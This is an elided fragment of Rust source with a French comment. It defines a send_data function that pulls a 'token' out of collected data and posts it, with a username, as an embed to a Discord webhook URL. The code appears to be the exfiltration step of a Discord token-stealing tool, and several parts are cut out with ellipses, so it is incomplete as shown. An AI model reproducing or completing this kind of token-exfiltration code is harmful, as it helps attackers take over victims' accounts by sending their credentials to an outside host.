...
pub fn send_data(webhook_url: &str, data: &str, username: &str) -> Result<u16, ()> {
    let parts: Vec<&str> = data.split("NOP").collect();

    // Extraire les données sous forme de chaînes de caractères simples
    let token = parts[0].trim_matches(|c| c == '[' || c == ']').replace("\"", "");
    ...
    "embeds": [
        {
            ...
            "thumbnail": {
                "url": "https://cdn.discordapp.com/emojis/948405394433253416.webp",
            },
        },
    ],
});
